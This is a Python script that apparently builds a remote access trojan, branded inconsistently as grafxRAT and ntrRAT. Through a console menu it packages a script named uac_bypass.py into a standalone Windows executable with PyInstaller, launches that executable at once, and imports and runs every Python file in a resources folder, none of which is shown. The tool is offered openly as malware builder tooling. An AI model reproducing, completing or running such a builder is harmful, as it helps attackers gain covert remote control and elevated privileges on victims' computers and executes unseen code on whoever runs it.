import os
import time
import subprocess
import importlib.util
import sys

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_logo():
    """Display the ASCII logo for grafxRAT."""
    logo = """
                                                       ░██                                                               
                                               ░   ████                                                               
                                         ▓██████  ████  ▒██████▓                                                      
                                      █████████  █     ██████████████                                                  
                                   ███████████  █████████▒ ▓█████████████                                             
                                ███████▓▓████   █████    ████████████████████                                         
                              ▓██              ███    ██████████████████████████                                      
                                               ██   ████████    ████▓██████████████                                   
                                                   ███████           █████████████████                                 
                                            ███   ████                     █████████████                              
                                            ██   ██                             ██████████                            
                                           ██   █                                  █████████                           
                                          ██   ▓                                      ▓███████                        
                                         ██                                              ██████                       
                                        ██▓                                                ░█████                     
                                       ███                                                    ████                    
                                      ▓██                                                       ███                   
                                      ██                                                         ███                  
                                     ██                                                            ██                 
                                    ██                                                              ██                
                                   ███                       ██                                       █                
                                  ███                                                                                 
                                 ███                                                                                  
                                 ██                                                                                   
                       ░█▓      ██   ███████████   ██████▓       ▒▓▓███▓           ██       ██████████                
                       ████    ███   ███████████   ██████████    ██████████       ████     ███████████                
                       ██████  ███       ███       ███    ███    ███    ███░     ██████         ██▒                   
                       ███████ ███       ███       ███    ███    ███    ███     ░███ ███        ██░                   
                       ███░ ██████       ███       █████████     █████████      ███  ███░       ██░                   
                       ███   █████       ███       ███  ███      ███  ███░     ██████████       ██▒                   
                       ████    ███       ███       ███   ███     ███   ███    ███▒     ███      ██▓                   
                         ▒░                        ░                    ███░            ▒░      ▒▒                    
                          ▓                                              ███                                          
                        ██                                                 ███                                         
                       ██                                                    ██                                       
                      ██                                                                                           
                     ███                                                                                           
                    ███                                                                                            
                   ░██                                                                                             
                   ██                                                                                              
                  ▓█       """
    print(logo)
    print("Welcome to ntrRAT - Remote Access Tool")
    print("=" * 70)

def display_menu():
    """Display the main menu."""
    print("\n[01] Build RAT")
    print("[02] Exit\n")
    print("Choose an option by entering the number:")

def build_rat():
    """Build a RAT executable by converting uac_bypass.py to an .exe."""
    clear_screen()
    print("Welcome to the RAT Builder!")
    print("The script uac_bypass.py will be automatically searched in the 'resources' folder.")
    
    while True:
        exe_name = input("\nEnter the name for the .exe file (without extension): ").strip()
        if exe_name:
            exe_name = exe_name.replace(" ", "_")  # Replace spaces with underscores
            break
        else:
            print("Invalid name. Please try again.")

    # Path to the script to convert
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "resources", "uac_bypass.py")
    if not os.path.exists(script_path):
        print(f"Error: The script '{script_path}' does not exist in the 'resources' folder.")
        input("\nPress Enter to return to the main menu...")
        return

    # Define the output directory dynamically
    base_path = os.path.dirname(os.path.abspath(__file__))
    output_dir = os.path.join(base_path, "Output")
    os.makedirs(output_dir, exist_ok=True)

    # Run PyInstaller to create the .exe
    print("\nBuilding your RAT executable, please wait...")
    time.sleep(2)
    exe_path = os.path.join(output_dir, exe_name + ".exe")
    build_command = f"pyinstaller --onefile --add-data \"resources;resources\" --distpath {output_dir} {script_path}"
    build_result = os.system(build_command)

    if build_result == 0:
        clear_screen()
        print(f"RAT built successfully: {exe_path}")
        
        # After the .exe is created, automatically run it
        print("Executing the generated .exe...")

        # Run the generated .exe to execute all scripts inside it
        subprocess.Popen([exe_path])  # This will launch the .exe generated by PyInstaller

        # Open the output folder in the file explorer
        if os.name == 'nt':  # Windows
            subprocess.Popen(f'explorer /select,"{exe_path}"')
        else:  # Unix/Linux/Mac
            subprocess.Popen(['xdg-open', output_dir])
        
        # Run all Python scripts in the resources folder
        run_all_scripts()

    else:
        print("\nError: Failed to build the RAT executable.")
    
    input("\nPress Enter to return to the main menu...")

def run_all_scripts():
    """Run all Python scripts in the 'resources' folder."""
    resources_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'resources')
    
    # List all Python files in the 'resources' directory
    for filename in os.listdir(resources_dir):
        if filename.endswith('.py'):
            script_path = os.path.join(resources_dir, filename)
            print(f"Executing script: {script_path}")
            
            # Dynamically load and execute the Python script
            spec = importlib.util.spec_from_file_location(filename, script_path)
            script_module = importlib.util.module_from_spec(spec)
            sys.modules[filename] = script_module
            spec.loader.exec_module(script_module)
            
    print("All scripts executed.")

def main():
    """Main program loop."""
    while True:
        clear_screen()
        display_logo()
        display_menu()
        
        choice = input("\nntrRAT> ").strip()

        if choice == "01":
            build_rat()
        elif choice == "02":
            clear_screen()
            print("\nExiting ntrRAT... Goodbye!")
            time.sleep(1)
            break
        else:
            clear_screen()
            print("\nInvalid option. Please try again.")
            time.sleep(2)

if __name__ == "__main__":
    main()
